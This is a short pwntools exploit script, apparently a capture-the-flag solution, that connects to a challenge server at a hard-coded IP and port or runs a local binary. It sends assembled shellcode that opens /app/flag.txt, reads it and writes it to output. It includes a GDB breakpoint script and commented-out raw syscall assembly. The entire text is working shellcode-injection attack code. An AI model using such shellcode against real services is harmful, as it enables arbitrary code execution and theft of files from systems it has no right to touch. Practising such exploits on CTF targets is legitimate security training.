#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

PATH = 'app/chall'

HOST = '103.167.136.89'
PORT = 10050

GDBSCRIPT = '''
set resolve-heap-via-heuristic on
b *main+253
'''

def debug(r):
    if type(r) == process:
        gdb.attach(r, GDBSCRIPT)

def exploit(r):
    shellcode  = shellcraft.open('/app/flag.txt', 0)
    # shellcode += '''
    #     mov rdi, rax
    #     mov rsi, rsp
    #     mov rdx, 0x100
    #     mov rax, 0
    #     syscall
    # '''
    shellcode += shellcraft.read('rax', 'rsp', 0x100)
    # shellcode += '''
    #     mov rdx, rax
    #     mov rdi, 1
    #     mov rsi, rsp
    #     mov rax, 1
    #     syscall
    # '''
    shellcode += shellcraft.write(1, 'rsp', 'rax')
    
    r.sendlineafter(b'Enter your shellcode:\n', asm(shellcode))
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)